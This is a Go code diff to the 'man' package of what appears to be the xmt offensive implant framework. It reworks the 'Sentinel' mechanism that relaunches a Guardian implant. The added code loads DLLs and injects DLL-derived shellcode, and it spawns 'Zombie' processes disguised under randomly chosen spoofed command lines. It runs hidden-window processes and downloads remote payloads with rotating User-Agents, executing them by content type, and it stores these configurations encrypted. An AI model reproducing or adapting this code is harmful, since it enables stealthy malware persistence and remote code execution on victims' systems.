@@ -19,15 +19,17 @@ package man
 import (
 	"context"
 	"crypto/cipher"
+	"crypto/rand"
 	"io"
-	"net/http"
 	"os"
-	"sync"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
 	"github.com/iDigitalFlame/xmt/cmd/filter"
+	"github.com/iDigitalFlame/xmt/data"
+	"github.com/iDigitalFlame/xmt/data/crypto"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
@@ -37,8 +39,14 @@ const (
 	// path without using the 'os.Executable' function.
 	Self = "*"
 
-	timeout    = time.Second * 2
-	timeoutWeb = time.Second * 30
+	sentPathExecute  uint8 = 0
+	sentPathDLL      uint8 = 1
+	sentPathASM      uint8 = 2
+	sentPathDownload uint8 = 3
+	sentPathZombie   uint8 = 4
+
+	timeout    = time.Second * 5
+	timeoutWeb = time.Second * 15
 )
 
 // ErrNoEndpoints is an error returned if no valid Guardian paths could be used
@@ -49,71 +57,13 @@ var ErrNoEndpoints = xerr.Sub("no paths found", 0x11)
 // functions in the 'man' package or can be Marshaled from a file or bytes
 // source.
 type Sentinel struct {
-	Filter *filter.Filter
-	Linker string
-	Paths  []string
+	paths []sentinelPath
+	filter.Filter
 }
-
-// Loader is an interface that allows for Sentinel structs to be built ONLY
-// AFTER a call to 'Check' returns false.
-//
-// This prevents reading of any Sentinel files if the Guardian already is
-// running and no action is needed.
-//
-// This is an internal interface that can be used by the 'LazyF' and 'LazyC'
-// functions.
-type Loader interface {
-	Wake(string) (bool, error)
-	Check(Linker, string) (bool, error)
-	WakeContext(context.Context, string) (bool, error)
-	CheckContext(context.Context, Linker, string) (bool, error)
-}
-type lazyLoader struct {
-	o sync.Once
-	r *Sentinel
-	f func() *Sentinel
-}
-
-// F is a helper function that can be used as an in-line function.
-//
-// This function will ALWAYS return a non-nil Sentinel.
-//
-// The returned Sentinel will be Marshaled from the supplied file path.
-// If any errors occur, an empty Sentinel struct will be returned instead.
-func F(p string) *Sentinel {
-	s, err := File(p)
-	if err == nil {
-		return s
-	}
-	return new(Sentinel)
-}
-func (z *lazyLoader) init() {
-	z.r = z.f()
-}
-
-// LazyF is a "Lazy" version of the 'F' function.
-//
-// This function will ONLY load and read the file contents if the 'Check' result
-// returns false.
-//
-// This function can be used in-place of Sentinel structs in all functions.
-func LazyF(p string) Loader {
-	return &lazyLoader{f: func() *Sentinel { return F(p) }}
-}
-func (s Sentinel) text() [][]byte {
-	v := make([][]byte, 0, len(s.Paths)+2)
-	if s.Filter != nil {
-		if b, err := s.Filter.MarshalJSON(); err == nil && len(b) > 2 {
-			v = append(v, b)
-		}
-	}
-	if len(s.Linker) > 0 {
-		v = append(v, []byte("*"+s.Linker))
-	}
-	for i := range s.Paths {
-		v = append(v, []byte(s.Paths[i]))
-	}
-	return v
+type sentinelPath struct {
+	path  string
+	extra []string
+	t     uint8
 }
 
 // Check will attempt to contact any current Guardians watching on the supplied
@@ -131,301 +81,504 @@ func Check(l Linker, n string) bool {
 	}
 	return v
 }
+func (p *sentinelPath) valid() bool {
+	if p.t > sentPathZombie || len(p.path) == 0 {
+		return false
+	}
+	if p.t > sentPathDownload && len(p.extra) == 0 {
+		return false
+	}
+	if p.t != sentPathDownload && p.t != sentPathExecute {
+		p.path = device.Expand(p.path)
+		if _, err := os.Stat(p.path); err != nil {
+			return false
+		}
+	}
+	if !cmd.LoaderEnabled && p.t == sentPathZombie {
+		return false
+	}
+	return true
+}
 
-// LinkerFromName will attempt to map the name provided to an appropriate Linker
-// interface.
+// AddDLL adds a DLL execution type to this Sentinel. This will NOT validate the
+// path beforehand.
+func (s *Sentinel) AddDLL(p string) {
+	s.paths = append(s.paths, sentinelPath{t: sentPathDLL, path: p})
+}
+
+// AddASM adds an ASM execution type to this Sentinel. This will NOT validate the
+// path beforehand.
 //
-// If no linker is found, the 'Pipe' Linker will be returned.
-func LinkerFromName(n string) Linker {
-	if len(n) == 0 {
-		return Pipe
+// This path may be a DLL file and will attempt to use the 'DLLToASM' conversion
+// function (if enabled).
+func (s *Sentinel) AddASM(p string) {
+	s.paths = append(s.paths, sentinelPath{t: sentPathASM, path: p})
+}
+
+// AddExecute adds a command execution type to this Sentinel. This will NOT validate
+// the command beforehand.
+func (s *Sentinel) AddExecute(p string) {
+	s.paths = append(s.paths, sentinelPath{t: sentPathExecute, path: p})
+}
+func (s *Sentinel) read(r io.Reader) error {
+	return s.UnmarshalStream(data.NewReader(r))
+}
+func (s *Sentinel) write(w io.Writer) error {
+	return s.MarshalStream(data.NewWriter(w))
+}
+func (p *sentinelPath) run(f *filter.Filter) error {
+	if bugtrack.Enabled {
+		bugtrack.Track("man.sentinelPath.run(): Running p.t=%d, p.path=%s", p.t, p.path)
 	}
-	switch {
-	case len(n) == 1 && (n[0] == 't' || n[0] == 'T'):
-		return TCP
-	case len(n) == 1 && (n[0] == 'p' || n[0] == 'P'):
-		return Pipe
-	case len(n) == 1 && (n[0] == 'e' || n[0] == 'E'):
-		return Event
-	case len(n) == 1 && (n[0] == 'm' || n[0] == 'M'):
-		return Mutex
-	case len(n) == 1 && (n[0] == 'n' || n[0] == 'N'):
-		return Mailslot
-	case len(n) == 1 && (n[0] == 's' || n[0] == 'S'):
-		return Semaphore
-	case len(n) == 3 && (n[0] == 't' || n[0] == 'T'):
-		return TCP
-	case len(n) == 4 && (n[0] == 'p' || n[0] == 'P'):
-		return Pipe
-	case len(n) == 5 && (n[0] == 'e' || n[0] == 'E'):
-		return Event
-	case len(n) == 5 && (n[0] == 'm' || n[0] == 'M'):
-		return Mutex
-	case len(n) == 8 && (n[0] == 'm' || n[0] == 'M'):
-		return Mailslot
-	case len(n) == 9 && (n[0] == 's' || n[0] == 'S'):
-		return Semaphore
+	switch p.t {
+	case sentPathDLL:
+		if bugtrack.Enabled {
+			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a DLL", p.t, p.path)
+		}
+		x := cmd.NewDLL(p.path)
+		x.SetParent(f)
+		err := x.Start()
+		x.Release()
+		return err
+	case sentPathASM:
+		if bugtrack.Enabled {
+			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is ASM", p.t, p.path)
+		}
+		b, err := os.ReadFile(p.path)
+		if err != nil {
+			return err
+		}
+		x := cmd.NewAsm(cmd.DLLToASM("", b))
+		x.SetParent(f)
+		err = x.Start()
+		x.Release()
+		return err
+	case sentPathZombie:
+		if bugtrack.Enabled {
+			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a Zombie", p.t, p.path)
+		}
+		b, err := os.ReadFile(p.path)
+		if err != nil {
+			return err
+		}
+		var a string
+		switch {
+		case len(p.extra) > 1:
+			a = p.extra[util.FastRandN(len(p.extra))]
+		case len(p.extra) == 0:
+			return cmd.ErrEmptyCommand
+		case len(p.extra) == 1:
+			a = p.extra[0]
+		}
+		x := cmd.NewZombie(cmd.DLLToASM("", b), cmd.Split(a)...)
+		x.SetParent(f)
+		x.SetNoWindow(true)
+		x.SetWindowDisplay(0)
+		err = x.Start()
+		x.Release()
+		return err
+	case sentPathExecute:
+		if p.path == Self {
+			if bugtrack.Enabled {
+				bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is Self", p.t, p.path)
+			}
+			e, err := os.Executable()
+			if err != nil {
+				return err
+			}
+			x := cmd.NewProcess(e)
+			x.SetParent(f)
+			x.SetNoWindow(true)
+			x.SetWindowDisplay(0)
+			err = x.Start()
+			x.Release()
+			return err
+		}
+		if bugtrack.Enabled {
+			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a Command", p.t, p.path)
+		}
+		x := cmd.NewProcess(cmd.Split(p.path)...)
+		x.SetParent(f)
+		x.SetNoWindow(true)
+		x.SetWindowDisplay(0)
+		err := x.Start()
+		x.Release()
+		return err
+	case sentPathDownload:
+		if bugtrack.Enabled {
+			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a Download", p.t, p.path)
+		}
+		var a string
+		switch {
+		case len(p.extra) > 1:
+			a = p.extra[util.FastRandN(len(p.extra))]
+		case len(p.extra) == 1:
+			a = p.extra[0]
+		}
+		x, p, err := WebExec(context.Background(), nil, p.path, a)
+		if err != nil {
+			return err
+		}
+		x.SetParent(f)
+		if err = x.Start(); err != nil && len(p) > 0 {
+			os.Remove(p)
+		}
+		x.Release()
+		return err
 	}
-	return Pipe
+	if bugtrack.Enabled {
+		bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is unknown!", p.t, p.path)
+	}
+	return cmd.ErrNotStarted
+}
+
+// AddZombie adds a command execution type to this Sentinel. This will NOT validate
+// the command and filepath beforehand.
+//
+// The supplied vardic of strings are the spoofed commands to be ran as. The
+// first argument of each fake command MUST be a real binary, but the arguments
+// can be whatever. AT LEAST ONE MUST BE SUPPLIED FOR THIS TO BE CONSIDERED VALID.
+//
+// Multiple spoofed commands may be used to generate a randomly picked command
+// on each runtime.
+//
+// This path may be a DLL file and will attempt to use the 'DLLToASM' conversion
+// function (if enabled).
+func (s *Sentinel) AddZombie(p string, a ...string) {
+	s.paths = append(s.paths, sentinelPath{t: sentPathZombie, path: p, extra: a})
+}
+
+// MarshalStream will convert the data in this Sentinel into binary that will
+// be written into the supplied Writer.
+func (s Sentinel) MarshalStream(w data.Writer) error {
+	if err := s.Filter.MarshalStream(w); err != nil {
+		return err
+	}
+	if err := w.WriteUint16(uint16(len(s.paths))); err != nil {
+		return err
+	}
+	for i := 0; i < len(s.paths) && i < 0xFFFF; i++ {
+		if err := s.paths[i].MarshalStream(w); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+// AddDownload adds a download execution type to this Sentinel. This will NOT validate
+// the URL beforehand.
+//
+// The URL will be downloaded on triggering and will be ran based of off the
+// 'Content-Type' HTTP header.
+//
+// The supplied vardic of strings is optional but can be used as a list of HTTP
+// User-Agents to be used. The strings support the 'text.Matcher' interface.
+//
+// Multiple User-Agents may be used to generate a randomly picked User-Agent on
+// each runtime.
+func (s *Sentinel) AddDownload(p string, a ...string) {
+	s.paths = append(s.paths, sentinelPath{t: sentPathDownload, path: p, extra: a})
 }
 
 // File will attempt to Marshal the Sentinel struct from the supplied file path.
-// This function will also attempt to fill in the Filter and Linker parameters.
+// This function will take any environment variables into account before loading.
 //
 // Any errors that occur during reading will be returned.
-func File(p string) (*Sentinel, error) {
-	// 0 - READONLY
-	f, err := os.OpenFile(p, 0, 0)
+func File(c cipher.Block, p string) (*Sentinel, error) {
+	var s Sentinel
+	if err := s.Load(c, device.Expand(p)); err != nil {
+		return nil, err
+	}
+	return &s, nil
+}
+
+// UnmarshalStream will attempt to read the data for this Sentinel from the
+// supplied Reader.
+func (s *Sentinel) UnmarshalStream(r data.Reader) error {
+	if err := s.Filter.UnmarshalStream(r); err != nil {
+		return err
+	}
+	n, err := r.Uint16()
 	if err != nil {
-		return nil, err
+		return err
 	}
-	s, err := Reader(f)
-	if f.Close(); err != nil {
-		return nil, err
-	}
-	return s, nil
-}
-
-// C is a helper function that can be used as an in-line function.
-//
-// This function will ALWAYS return a non-nil Sentinel.
-//
-// This function uses the provided 'cipher.Block' to decrypt the resulting file
-// data. A nil block is the same as a 'F(p)' call.
-//
-// The returned Sentinel will be Marshaled from the supplied Cipher and file
-// path.
-//
-// If any errors occur, an empty Sentinel struct will be returned instead.
-func C(c cipher.Block, p string) *Sentinel {
-	s, err := Crypt(c, p)
-	if err == nil {
-		return s
-	}
-	return new(Sentinel)
-}
-
-// LazyC is a "Lazy" version of the 'C' function.
-//
-// This function will ONLY load and read the file contents if the 'Check' result
-// returns false.
-//
-// This function can be used in-place of Sentinel structs in all functions.
-func LazyC(c cipher.Block, p string) Loader {
-	return &lazyLoader{f: func() *Sentinel { return C(c, p) }}
-}
-func exec(f *filter.Filter, p ...string) error {
-	if len(p) == 0 {
-		return cmd.ErrEmptyCommand
-	}
-	if bugtrack.Enabled {
-		bugtrack.Track("man.exec(): Running p=%s", p)
-	}
-	var (
-		n = len(p[0])
-		e cmd.Runnable
-	)
-	if device.OS == device.Windows && (n > 4 && (p[0][n-1] == 'l' || p[0][n-1] == 'L') && (p[0][n-3] == 'd' || p[0][n-3] == 'D') && p[0][n-4] == '.') {
-		// NOTE(dij): Work on this after Migration
-		// 1 -in- 5 chance of using a Zombie process instead.
-		// if util.FastRandN(5) == 0 {
-		//	x := cmd.NewZombie(nil, "svchost.exe", "-k", "RPCSS", "-p")
-		//	x.Path = p[0]
-		//	x.SetWindowDisplay(0)
-		//	x.SetNoWindow(true)
-		//	e = x
-		//} else {
-		e = cmd.NewDLL(p[0])
-		//}
-	} else {
-		x := cmd.NewProcess(p...)
-		x.SetWindowDisplay(0)
-		x.SetNoWindow(true)
-		e = x
-	}
-	e.SetParent(f)
-	return e.Start()
-}
-
-// Wake will attempt to look for a Guardian using the provided path. This uses
-// the set Linker in the Sentinel.
-//
-// This function will return true and nil if a Guardian is launched and false
-// and nil if a Guardian was found. Any other errors that occur will also be
-// returned with false.
-func (s Sentinel) Wake(n string) (bool, error) {
-	return s.WakeContext(context.Background(), n)
-}
-func (z *lazyLoader) Wake(n string) (bool, error) {
-	return z.WakeContext(context.Background(), n)
-}
-
-// Check will attempt to look for a Guardian using the provided Linker and path.
-// This overrides the set Linker in the Sentinel.
-//
-// This function will return true and nil if a Guardian is launched and false
-// and nil if a Guardian was found. Any other errors that occur will also be
-// returned with false.
-func (s Sentinel) Check(l Linker, n string) (bool, error) {
-	return s.CheckContext(context.Background(), l, n)
-}
-func (z *lazyLoader) Check(l Linker, n string) (bool, error) {
-	return z.CheckContext(context.Background(), l, n)
-}
-
-// WakeContext will attempt to look for a Guardian using the provided path.
-// This uses the set Linker in the Sentinel and will use the provided Context
-// for cancelation.
-//
-// This function will return true and nil if a Guardian is launched and false
-// and nil if a Guardian was found. Any other errors that occur will also be
-// returned with false.
-func (s Sentinel) WakeContext(x context.Context, n string) (bool, error) {
-	return s.CheckContext(x, LinkerFromName(s.Linker), n)
-}
-func (z *lazyLoader) WakeContext(x context.Context, n string) (bool, error) {
-	z.o.Do(z.init)
-	return z.r.CheckContext(x, LinkerFromName(z.r.Linker), n)
-}
-func download(x context.Context, f *filter.Filter, u string) (string, error) {
-	var (
-		q, c = context.WithTimeout(x, timeout*5)
-		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
-	)
-	i, err := client.Do(r)
-	if c(); err != nil {
-		return "", err
-	}
-	b, err := io.ReadAll(i.Body)
-	if i.Body.Close(); err != nil {
-		return "", err
-	}
-	if bugtrack.Enabled {
-		bugtrack.Track("man.download(): Download u=%s", u)
-	}
-	var d bool
-	switch ParseDownloadHeader(i.Header) {
-	case 1:
-		// NOTE(dij): Add transform DLL -to- Shellcode conversion here?
-		d = true
-	case 2:
-		if bugtrack.Enabled {
-			bugtrack.Track("man.download(): Download is shellcode u=%s", u)
+	s.paths = make([]sentinelPath, n)
+	for i := uint16(0); i < n; i++ {
+		if err = s.paths[i].UnmarshalStream(r); err != nil {
+			return err
 		}
-		e := cmd.NewAsmContext(x, b)
-		e.SetParent(f)
-		return "", e.Start()
-	case 3:
-		e := cmd.NewProcessContext(x, device.Shell, device.ShellArgs, string(b))
-		e.SetParent(f)
-		e.SetNoWindow(true)
-		e.SetWindowDisplay(0)
-		return "", e.Start()
-	case 4:
-		e := cmd.NewProcessContext(x, device.PowerShell, "-comm", string(b))
-		e.SetParent(f)
-		e.SetNoWindow(true)
-		e.SetWindowDisplay(0)
-		return "", e.Start()
 	}
-	var n string
-	if d {
-		n = execB
-	} else if device.OS == device.Windows {
-		n = execC
-	} else {
-		n = execA
-	}
-	z, err := os.CreateTemp("", n)
-	if err != nil {
-		return "", err
-	}
-	p := z.Name()
-	_, err = z.Write(b)
-	if z.Close(); err != nil {
-		return p, err
-	}
-	if bugtrack.Enabled {
-		bugtrack.Track("man.download(): Download to tempfile u=%s, p=%s", u, p)
-	}
-	if os.Chmod(z.Name(), 0755); d {
-		e := cmd.NewDLL(z.Name())
-		e.SetParent(f)
-		return p, e.Start()
-	}
-	e := cmd.NewProcessContext(x, p)
-	e.SetParent(f)
-	e.SetNoWindow(true)
-	e.SetWindowDisplay(0)
-	return p, e.Start()
+	return nil
 }
 
-// CheckContext will attempt to look for a Guardian using the provided Linker and
-// path. This overrides the set Linker in the Sentinel and will use the provided
-// Context for cancelation.
+// Save will attempt to write the Sentinel data to the supplied on-device file
+// path. This function will take any environment variables into account before
+// writing.
 //
-// This function will return true and nil if a Guardian is launched and false
-// and nil if a Guardian was found. Any other errors that occur will also be
-// returned with false.
-func (s Sentinel) CheckContext(x context.Context, l Linker, n string) (bool, error) {
-	if Check(l, n) {
-		return false, nil
+// If the supplied cipher is not nil, it will be used to encrypt the data durring
+// writing. Otherwise the data will be un-encrypted.
+//
+// Any errors that occur during writing will be returned.
+func (s *Sentinel) Save(c cipher.Block, p string) error {
+	// 0x242 - CREATE | TRUNCATE | RDWR
+	f, err := os.OpenFile(device.Expand(p), 0x242, 0o644)
+	if err != nil {
+		return err
 	}
-	return wake(x, l, n, s.Filter, s.Paths)
+	err = s.Write(c, f)
+	f.Close()
+	return err
 }
-func (z *lazyLoader) CheckContext(x context.Context, l Linker, n string) (bool, error) {
-	if Check(l, n) {
-		return false, nil
+
+// Load will attempt to read the Sentinel struct from the supplied file path.
+// This function will take any environment variables into account before reading.
+//
+// If the supplied cipher is not nil, it will be used to decrypt the data durring
+// reader. Otherwise the data will read un-encrypted.
+//
+// Any errors that occur during reading will be returned.
+func (s *Sentinel) Load(c cipher.Block, p string) error {
+	// 0x242 - READONLY
+	f, err := os.OpenFile(device.Expand(p), 0, 0)
+	if err != nil {
+		return err
 	}
-	z.o.Do(z.init)
-	return wake(x, l, n, z.r.Filter, z.r.Paths)
+	err = s.Read(c, f)
+	f.Close()
+	return err
 }
-func wake(x context.Context, l Linker, n string, f *filter.Filter, p []string) (bool, error) {
-	if len(p) == 0 {
+func (p sentinelPath) MarshalStream(w data.Writer) error {
+	if err := w.WriteUint8(p.t); err != nil {
+		return err
+	}
+	if err := w.WriteString(p.path); err != nil {
+		return err
+	}
+	if p.t < sentPathDownload {
+		return nil
+	}
+	return data.WriteStringList(w, p.extra)
+}
+
+// Find will initiate the Sentinel's Guardian launching routine and will seek
+// through all it's stored paths to launch a Guardian.
+//
+// The Linker and name passed to this function are used to determine if the newly
+// launched Guardian comes up and responds correctly (within the appropriate time
+// constraints).
+//
+// This function will return true and nil if a Guardian was launched. Otherwise
+// the boolean will be false and the error will explain the cause.
+//
+// Errors caused by Sentinel paths will NOT stop the search and the most likely
+// error returned will be 'ErrNoEndpoints' which results when no Guardians could
+// be loaded.
+func (s *Sentinel) Find(l Linker, n string) (bool, error) {
+	if len(s.paths) == 0 {
 		return false, ErrNoEndpoints
 	}
-	var err error
-	if f == nil {
+	var (
+		f   = &s.Filter
+		err error
+	)
+	if f.Empty() {
 		f = filter.Any
 	}
-	for i := range p {
-		if len(p[i]) == 0 {
+	for i := range s.paths {
+		if !s.paths[i].valid() {
 			continue
 		}
 		if bugtrack.Enabled {
-			bugtrack.Track("man.wake(): n=%s, i=%d, p[i]=%s", n, i, p[i])
+			bugtrack.Track("man.Sentinel.Find(): n=%s, i=%d, s.paths[i].t=%d", n, i, s.paths[i].t)
 		}
-		switch {
-		case p[i] == Self:
-			var e string
-			if e, err = os.Executable(); err == nil {
-				err = exec(f, e)
-			}
-		case len(p[i]) > 5 && (p[i][0] == 'h' || p[i][0] == 'H') && (p[i][1] == 't' || p[i][1] == 'T') && (p[i][2] == 't' || p[i][2] == 'T') && (p[i][3] == 'p' || p[i][3] == 'P'):
-			var e string
-			if e, err = download(x, f, p[i]); err != nil && len(e) > 0 {
-				os.Remove(e)
-			}
-		default:
-			if _, err = os.Stat(p[i]); err == nil {
-				err = exec(f, p[i])
-			}
-		}
-		if err == nil {
+		if err = s.paths[i].run(f); err != nil {
 			if bugtrack.Enabled {
-				bugtrack.Track("man.wake(): Wake passed, no errors. Checking l.(type)=%T, n=%s now.", l, n)
+				bugtrack.Track("man.Sentinel.Find(): n=%s, i=%d, s.paths[i].t=%d, err=%s", n, i, s.paths[i].t, err)
 			}
-			if time.Sleep(timeout); !Check(l, n) {
-				if bugtrack.Enabled {
-					bugtrack.Track("man.wake(): Wake l.(type)=%T, n=%s failed.", l, n)
-				}
+			continue
+		}
+		if bugtrack.Enabled {
+			bugtrack.Track("man.Sentinel.Find(): Wake passed, no errors. Checking l.(type)=%T, n=%s now.", l, n)
+		}
+		if time.Sleep(timeout); !Check(l, n) {
+			if bugtrack.Enabled {
+				bugtrack.Track("man.Sentinel.Find(): Wake l.(type)=%T, n=%s failed.", l, n)
+			}
+			continue
+		}
+		if bugtrack.Enabled {
+			bugtrack.Track("man.Sentinel.Find(): Wake l.(type)=%T, n=%s passed!", l, n)
+		}
+		return true, nil
+	}
+	if err == nil {
+		err = ErrNoEndpoints
+	}
+	return false, err
+}
+
+// Wake will attempt to locate a Gurdian with the supplied Linker and name. If
+// no Guardian is found, the 'Find' function will be triggered and will staring
+// the launching routine.
+//
+// This function will return true and nil if a Guardian was launched. Otherwise
+// the boolean will be false and the error will explain the cause. If the error
+// is nil, this means that a Guardian was detected.
+//
+// Errors caused by Sentinel paths will NOT stop the search and the most likely
+// error returned will be 'ErrNoEndpoints' which results when no Guardians could
+// be loaded.
+func (s *Sentinel) Wake(l Linker, n string) (bool, error) {
+	if Check(l, n) {
+		return false, nil
+	}
+	return s.Find(l, n)
+}
+
+// Read will attempt to read the Sentinel data from the supplied Reader. If the
+// supplied cipher is not nil, it will be used to decrypt the data durring reader.
+// Otherwise the data will read un-encrypted.
+func (s *Sentinel) Read(c cipher.Block, r io.Reader) error {
+	if c == nil {
+		return s.read(r)
+	}
+	var (
+		k      = make([]byte, c.BlockSize())
+		n, err = r.Read(k)
+	)
+	if err != nil {
+		return err
+	}
+	if n != c.BlockSize() {
+		return io.ErrUnexpectedEOF
+	}
+	i, err := crypto.Decrypter(c, k, r)
+	if err != nil {
+		return err
+	}
+	err = s.read(i)
+	i.Close()
+	return err
+}
+func (p *sentinelPath) UnmarshalStream(r data.Reader) error {
+	if err := r.ReadUint8(&p.t); err != nil {
+		return err
+	}
+	if err := r.ReadString(&p.path); err != nil {
+		return err
+	}
+	if p.t < sentPathDownload {
+		return nil
+	}
+	return data.ReadStringList(r, &p.extra)
+}
+
+// Write will attempt to write the Sentinel data to the supplied Writer. If the
+// supplied cipher is not nil, it will be used to encrypt the data durring writing.
+// Otherwise the data will be un-encrypted.
+func (s *Sentinel) Write(c cipher.Block, w io.Writer) error {
+	if c == nil {
+		return s.write(w)
+	}
+	var (
+		k      = make([]byte, c.BlockSize())
+		_, err = rand.Read(k)
+	)
+	if err != nil {
+		return err
+	}
+	n, err := w.Write(k)
+	if err != nil {
+		return err
+	}
+	if n != c.BlockSize() {
+		return io.ErrShortWrite
+	}
+	o, err := crypto.Encrypter(c, k, w)
+	if err != nil {
+		return err
+	}
+	err = s.write(o)
+	o.Close()
+	return err
+}
+
+// WakeMultiFile is similar to 'WakeFile' except this function will attempt to load
+// multiple Sentinels from the supplied vardic of string paths.
+//
+// This function will first check for the existence of a Guardian with the supplied
+// Linker and name before attempting to load any Sentinels.
+//
+// Sentinels will be loaded in a random order then the 'Find' function of each
+// one will be ran.
+//
+// If the supplied cipher is not nil, it will be used to decrypt the data durring
+// reader. Otherwise the data will read un-encrypted.
+//
+// This function will return true and nil if a Guardian was launched. Otherwise
+// the boolean will be false and the error will explain the cause. If the error
+// is nil, this means that a Guardian was detected.
+func WakeMultiFile(l Linker, name string, c cipher.Block, paths []string) (bool, error) {
+	if len(paths) == 0 {
+		return false, ErrNoEndpoints
+	}
+	if len(paths) == 1 {
+		_, r, err := WakeFile(l, name, c, paths[0])
+		return r, err
+	}
+	if Check(l, name) {
+		return false, nil
+	}
+	// NOTE(dij): Instead of running concurrently, do these randomally, but only
+	//            pick len() many times. Obviously, we might not cover 100% but
+	//            *shrug*.
+	//
+	//            We can cover duplicates though with 'e'.
+	var (
+		e   = make([]*Sentinel, len(paths))
+		r   bool
+		err error
+	)
+	for i, v := 0, 0; i < len(paths); i++ {
+		if v = int(util.FastRandN(len(paths))); e[v] == nil {
+			if e[v], err = File(c, paths[v]); err != nil {
 				continue
 			}
+		}
+		/*} else {
+			// NOTE(dij): Should we run again already loaded entries?
+			//            Defaults to yes.
+		}*/
+		if r, err = e[v].Find(l, name); err != nil {
+			continue
+		}
+		if r {
 			return true, nil
 		}
 	}
-	if err != nil {
-		return false, err
+	return false, nil
+}
+
+// WakeFile will attempt to load a Sentinel from the supplied string path if a
+// Guardian cannot be detected with the supplied Linker and name.
+//
+// If no Guardian was found the Sentinel will be loadedand  the 'Find' function
+// one will be ran.
+//
+// If the supplied cipher is not nil, it will be used to decrypt the data durring
+// reader. Otherwise the data will read un-encrypted.
+//
+// This function will return true and nil if a Guardian was launched. Otherwise
+// the boolean will be false and the error will explain the cause. If the error
+// is nil, this means that a Guardian was detected.
+func WakeFile(l Linker, name string, c cipher.Block, path string) (*Sentinel, bool, error) {
+	if Check(l, name) {
+		return nil, false, nil
 	}
-	return false, ErrNoEndpoints
+	s, err := File(c, path)
+	if err != nil {
+		return nil, false, err
+	}
+	r, err := s.Wake(l, name)
+	return s, r, err
 }
